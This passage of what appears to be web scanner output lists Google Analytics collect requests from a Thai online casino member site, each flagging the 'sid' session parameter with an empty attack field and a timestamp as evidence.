%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=7963
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274555034&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=19022&tfd=26998
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274555034&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=2171&tfd=13126
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274577052&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948811~104948813~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fhistory&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=3462
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274577052&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948811~104948813~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fhistory&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=7543&tfd=11034
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274577052&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948811~104948813~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fhistory&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fwithdraw&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=1618&tfd=8470
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274587026&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=7221
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274587026&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754277162&sct=2&seg=0&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_ss=1&tfd=2577419
Method	POST
Parameter	sid
Attack	
Evidence	1754277162
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754274587026&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754274189&sct=1&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=13080&tfd=59230
Method	POST
Parameter	sid
Attack	
Evidence	1754274189
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754278073138&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754277162&sct=2&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=9821
Method	POST
Parameter	sid
Attack	
Evidence	1754277162
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754278073138&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=2&sid=1754280655&sct=3&seg=0&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_ss=1&tfd=2587177
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754280656930&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Freward&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%A